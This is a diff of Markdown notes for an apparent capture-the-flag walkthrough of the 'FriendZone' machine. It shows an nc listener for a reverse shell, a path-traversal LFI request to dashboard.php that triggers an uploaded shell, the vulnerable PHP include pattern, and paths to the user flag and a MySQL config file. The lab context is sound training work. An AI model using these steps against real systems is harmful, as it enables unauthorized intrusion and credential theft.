@@ -11,11 +11,7 @@ jupyter: python3
 toc: true
 ---
 
-![](images/friendzone_logo.png){: style="float: right; width: 200px; margin-left: 2em"}
 
-N/A<br><br><br><br><br><br><br>
-
-----------------
 
 
 # USER
@@ -56,17 +52,21 @@ Prepare `nc` to grab reverse shell
 nc -lnvp 4455
 ```
 
-Use LFI through dashboard.php to trigger reverse shell.<br>
+Use LFI through dashboard.php to trigger reverse shell.
+
 With previous enumeration of smb shares we found the path to `/etc/Development` where our shell will be uploaded.
 
 `dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r`
 
-> **NOTE1:**<br>
+> **NOTE1:**
+
 > Probably smart to upload a test file, like `<?php phpinfo(); ?>`, before going for the reverse shell.
 
 
-> **NOTE2:**<br>
-> The php call will look something like this: `<?php “include/”.include($_GET['pagename'].“.php”); ?>`<br>
+> **NOTE2:**
+
+> The php call will look something like this: `<?php “include/”.include($_GET['pagename'].“.php”); ?>`
+
 > Do not end your filename with `.php` as this is already done in the code and you'll create a double file ending. 
 
 Grab user: `/home/friend/user.txt`
@@ -78,7 +78,9 @@ ls /var/www/htm/mysql_data.conf
 ```
 
 ---------
-<br><br>
+
+
+
 
 # ROOT
 
